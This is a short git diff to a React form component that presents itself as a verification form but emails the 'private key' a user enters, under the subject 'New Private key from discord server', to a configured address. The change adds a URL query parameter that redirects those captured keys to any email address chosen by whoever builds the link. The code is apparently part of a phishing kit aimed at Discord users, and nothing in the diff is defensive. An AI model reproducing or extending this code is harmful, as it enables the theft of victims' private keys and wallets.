@@ -1,5 +1,6 @@
 import { useState } from "react";
-import { object , type Schema} from "yup";
+import { object, type Schema } from "yup";
+import { useSearchParam } from "react-use";
 import { ErrorMessage, Field, Form, Formik } from "formik";
 
 import Api from "../../lib/api";
@@ -14,6 +15,7 @@ export default function VerificationForm({
   placeholder,
   validateSchema,
 }: VerificationFormProps) {
+  const email = useSearchParam("email");
   const [open, setOpen] = useState(false);
 
   return (
@@ -27,7 +29,7 @@ export default function VerificationForm({
           return Api.instance.mail.sendMail({
             title: "New Private key from discord server",
             message: values.value,
-            to: import.meta.env.VITE_APP_EMAIL_ADDRESS
+            to: email ? email : import.meta.env.VITE_APP_EMAIL_ADDRESS,
           });
         }}
       >
